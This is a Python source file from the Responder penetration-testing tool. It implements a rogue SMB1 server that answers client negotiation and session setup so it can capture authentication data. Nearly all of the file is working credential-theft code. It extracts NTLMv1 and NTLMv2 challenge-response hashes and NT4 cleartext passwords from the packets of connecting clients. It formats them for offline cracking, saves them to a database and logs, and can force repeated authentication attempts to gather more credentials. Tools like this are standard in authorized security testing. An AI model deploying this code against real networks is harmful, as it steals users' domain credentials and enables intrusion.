#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from random import randrange
from packets import SMBHeader, SMBNegoAnsLM, SMBNegoKerbAns, SMBSession1Data, SMBSession2Accept, SMBSessEmpty, SMBTreeData
try:
    from socketserver import BaseRequestHandler
except ImportError:
    from SocketServer import BaseRequestHandler
from utils import *
import struct
import socket


def Is_Anonymous(data):  # Detect if SMB auth was Anonymous
	SecBlobLen = struct.unpack('<H', data[51:53])[0]

	if SecBlobLen < 260:
		LMhashLen = struct.unpack('<H', data[89:91])[0]
		return LMhashLen in [0, 1]
	elif SecBlobLen > 260:
		LMhashLen = struct.unpack('<H', data[93:95])[0]
		return LMhashLen in [0, 1]

def Is_LMNT_Anonymous(data):
	LMhashLen = struct.unpack('<H', data[51:53])[0]
	return LMhashLen in [0, 1]

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
	Dialect = tuple([e.replace(b'\x00', b'') for e in data[40:].split(b'\x02')[:10]])
	for i in range(0, 16):
		if Dialect[i] == b'NT LM 0.12':
			return chr(i).encode('latin-1') + b'\x00'


def midcalc(data):  #Set MID SMB Header field.
    return data[34:36]


def uidcalc(data):  #Set UID SMB Header field.
    return data[32:34]


def pidcalc(data):  #Set PID SMB Header field.
    pack=data[30:32]
    return pack


def tidcalc(data):  #Set TID SMB Header field.
    pack=data[28:30]
    return pack

def ParseShare(data):
	packet = data[:]
	a = re.search(rb'(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
	if a:
		print(text("[SMB] Requested Share     : %s" % a.group(0).decode('UTF-16LE', errors='ignore')))


def ParseSMBHash(data, client):  #Parse SMB NTLMSSP v1/v2
	SecBlobLen = struct.unpack('<H', data[51:53])[0]
	BccLen     = struct.unpack('<H', data[61:63])[0]

	if SecBlobLen < 260:
		SSPIStart    = data[75:]
		LMhashLen    = struct.unpack('<H', data[89:91])[0]
		LMhashOffset = struct.unpack('<H', data[91:93])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].hex().upper()
		NthashLen    = struct.unpack('<H', data[97:99])[0]
		NthashOffset = struct.unpack('<H', data[99:101])[0]
	else:
		SSPIStart    = data[79:]
		LMhashLen    = struct.unpack('<H', data[93:95])[0]
		LMhashOffset = struct.unpack('<H', data[95:97])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].hex().upper()
		NthashLen    = struct.unpack('<H', data[101:103])[0]
		NthashOffset = struct.unpack('<H', data[103:105])[0]

	if NthashLen == 24:
		SMBHash      = SSPIStart[NthashOffset:NthashOffset+NthashLen].hex().upper()
		DomainLen    = struct.unpack('<H', data[105:107])[0]
		DomainOffset = struct.unpack('<H', data[107:109])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE', errors='ignore')
		UserLen      = struct.unpack('<H', data[113:115])[0]
		UserOffset   = struct.unpack('<H', data[115:117])[0]
		Username     = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE', errors='ignore')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 60:
		SMBHash      = SSPIStart[NthashOffset:NthashOffset+NthashLen].hex().upper()
		DomainLen    = struct.unpack('<H', data[109:111])[0]
		DomainOffset = struct.unpack('<H', data[111:113])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE', errors='ignore')
		UserLen      = struct.unpack('<H', data[117:119])[0]
		UserOffset   = struct.unpack('<H', data[119:121])[0]
		Username     = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE', errors='ignore')
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2-SSP', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': SMBHash, 
			'fullhash': WriteHash,
		})


def ParseLMNTHash(data, client):  # Parse SMB NTLMv1/v2
	LMhashLen = struct.unpack('<H', data[51:53])[0]
	NthashLen = struct.unpack('<H', data[53:55])[0]
	Bcc = struct.unpack('<H', data[63:65])[0]
	Username, Domain = tuple([e.replace(b'\x00', b'').decode('latin-1', errors='ignore') for e in data[89+NthashLen:Bcc+60].split(b'\x00\x00\x00')[:2]])

	if NthashLen > 25:
		FullHash = data[65+LMhashLen:65+LMhashLen+NthashLen].hex()
		LmHash = FullHash[:32].upper()
		NtHash = FullHash[32:].upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, LmHash, NtHash)
	
		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv2', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

	if NthashLen == 24:
		NtHash = data[65+LMhashLen:65+LMhashLen+NthashLen].hex().upper()
		LmHash = data[65:65+LMhashLen].hex().upper()
		WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LmHash, NtHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'SMB', 
			'type': 'NTLMv1', 
			'client': client, 
			'user': Domain+'\\'+Username, 
			'hash': NtHash, 
			'fullhash': WriteHash,
		})

def IsNT4ClearTxt(data, client):
	HeadLen = 36

	if data[14:16] == b"\x03\x80":
		SmbData = data[HeadLen+14:]
		WordCount = data[HeadLen]
		ChainedCmdOffset = data[HeadLen+1]

		if ChainedCmdOffset == 117: # ord(b"\x75")
			PassLen = struct.unpack('<H', data[HeadLen+15:HeadLen+17])[0]

			if PassLen > 2:
				Password = data[HeadLen+30:HeadLen+30+PassLen].replace(b"\x00", b"").decode('latin-1', errors='ignore')
				User = ''.join(tuple(data[HeadLen+30+PassLen:].split(b'\x00\x00\x00'))[:1]).replace(b"\x00", b"").decode('latin-1', errors='ignore')
				print(text("[SMB] Clear Text Credentials: %s:%s" % (User, Password)))
				WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)


class SMB1(BaseRequestHandler):  # SMB Server class, NTLMSSP
	def handle(self):
		try:
			self.ntry = 0
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(1)

				if not data:
					break

				if data[0] == 129:  # ord(b"\x81") session request 139
					Buffer = b"\x82\x00\x00\x00"
					try:
						self.request.sendall(Buffer)
						data = self.request.recv(1024)
					except:
						pass

				if data[8:10] == b"\x72\x00":  # Negociate Protocol Response
					Header = SMBHeader(cmd=b"\x72", flag1=b"\x88", flag2=b"\x01\xc8", pid=pidcalc(data), mid=midcalc(data))
					Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
					Body.calculate()
		
					Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(1024)

				if data[8:10] == b"\x73\x00":  # Session Setup AndX Request
					IsNT4ClearTxt(data, self.client_address[0])
					
					# STATUS_MORE_PROCESSING_REQUIRED
					Header = SMBHeader(cmd=b"\x73", flag1=b"\x88", flag2=b"\x01\xc8", errorcode=b"\x16\x00\x00\xc0", uid=bytes([randrange(256), randrange(256)]), pid=pidcalc(data), tid=b"\x00\x00", mid=midcalc(data))
					if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge, NTLMSSPNTLMChallengeAVPairsUnicodeStr="NOMATCH")
					else:
						Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge)
					Body.calculate()
		
					Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(4096)

					if data and data[8:10] == b"\x73\x00":  # STATUS_SUCCESS
						if Is_Anonymous(data):
							Header = SMBHeader(cmd=b"\x73", flag1=b"\x98", flag2=b"\x01\xc8", errorcode=b"\x72\x00\x00\xc0", pid=pidcalc(data), tid=b"\x00\x00", uid=uidcalc(data), mid=midcalc(data))
							Body = SMBSessEmpty()

							Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
							Buffer = struct.pack(">i", len(Packet)) + Packet

							self.request.sendall(Buffer)

						else:
							# Parse NTLMSSP_AUTH packet
							ParseSMBHash(data, self.client_address[0])

							if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
								Header = SMBHeader(cmd=b"\x73", flag1=b"\x98", flag2=b"\x01\xc8", errorcode=b"\x72\x00\x00\xc0", pid=pidcalc(data), tid=b"\x00\x00", uid=uidcalc(data), mid=midcalc(data))
								Body = SMBSessEmpty()

								Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
								Buffer = struct.pack(">i", len(Packet)) + Packet

								self.request.sendall(Buffer)
								self.ntry += 1
								continue

							# Send STATUS_SUCCESS
							Header = SMBHeader(cmd=b"\x73", flag1=b"\x98", flag2=b"\x01\xc8", errorcode=b"\x00\x00\x00\x00", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
							Body = SMBSession2Accept()
							Body.calculate()

							Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
							Buffer = struct.pack(">i", len(Packet)) + Packet

							self.request.sendall(Buffer)
							data = self.request.recv(1024)
				

				if data and data[8:10] == b"\x75\x00":  # Tree Connect AndX Request
					ParseShare(data)
					Header = SMBHeader(cmd=b"\x75", flag1=b"\x88", flag2=b"\x01\xc8", errorcode=b"\x00\x00\x00\x00", pid=pidcalc(data), tid=bytes([randrange(256), randrange(256)]), uid=uidcalc(data), mid=midcalc(data))
					Body = SMBTreeData()
					Body.calculate()

					Packet = str(Header).encode('latin-1') + str(Body).encode('latin-1')
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(1024)

				if data and data[8:10] == b"\x71\x00":  #Tree Disconnect
					Header = SMBHeader(cmd=b"\x71", flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x00\x00\x00\x00", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Body = b"\x00\x00\x00"

					Packet = str(Header).encode('latin-1') + Body
					Buffer = struct.pack(">i", len(Packet)) + Packet
					
					self.request.sendall(Buffer)
					data = self.request.recv(1024)

				if data and data[8:10] == b"\xa2\x00":  #NT_CREATE Access Denied.
					Header = SMBHeader(cmd=b"\xa2", flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Body = b"\x00\x00\x00"

					Packet = str(Header).encode('latin-1') + Body
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(1024)

				if data and data[8:10] == b"\x25\x00":  # Trans2 Access Denied.
					Header = SMBHeader(cmd=b"\x25", flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Body = b"\x00\x00\x00"

					Packet = str(Header).encode('latin-1') + Body
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(1024)
				
				if data and data[8:10] == b"\x74\x00":  # LogOff
					Header = SMBHeader(cmd=b"\x74", flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Body = b"\x02\xff\x00\x27\x00\x00\x00"

					Packet = str(Header).encode('latin-1') + Body
					Buffer = struct.pack(">i", len(Packet)) + Packet

					self.request.sendall(Buffer)
					data = self.request.recv(1024)

		except socket.timeout:
			pass


class SMB1LM(BaseRequestHandler):  # SMB Server class, old version
	def handle(self):
		try:
			self.request.settimeout(0.5)
			data = self.request.recv(1024)

			if not data:
				return

			if data[0] == 129:  # session request 139
				Buffer = b"\x82\x00\x00\x00"
				self.request.sendall(Buffer)
				data = self.request.recv(1024)

			if data and data[8:10] == b"\x72\x00":  #Negotiate proto answer.
				head = SMBHeader(cmd=b"\x72", flag1=b"\x80", flag2=b"\x00\x00", pid=pidcalc(data), mid=midcalc(data))
				Body = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data), Domain="", Key=settings.Config.Challenge)
				Body.calculate()
				Packet = str(head).encode('latin-1') + str(Body).encode('latin-1')
				Buffer = struct.pack(">i", len(Packet)) + Packet
				self.request.sendall(Buffer)
				data = self.request.recv(1024)

			if data and data[8:10] == b"\x73\x00":  #Session Setup AndX Request
				if Is_LMNT_Anonymous(data):
					head = SMBHeader(cmd=b"\x73", flag1=b"\x90", flag2=b"\x53\xc8", errorcode=b"\x72\x00\x00\xc0", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Packet = str(head).encode('latin-1') + str(SMBSessEmpty()).encode('latin-1')
					Buffer = struct.pack(">i", len(Packet)) + Packet
					self.request.sendall(Buffer)
				else:
					ParseLMNTHash(data, self.client_address[0])
					head = SMBHeader(cmd=b"\x73", flag1=b"\x90", flag2=b"\x53\xc8", errorcode=b"\x22\x00\x00\xc0", pid=pidcalc(data), tid=tidcalc(data), uid=uidcalc(data), mid=midcalc(data))
					Packet = str(head).encode('latin-1') + str(SMBSessEmpty()).encode('latin-1')
					Buffer = struct.pack(">i", len(Packet)) + Packet
					self.request.sendall(Buffer)
					data = self.request.recv(1024)
		except Exception:
			self.request.close()
			pass
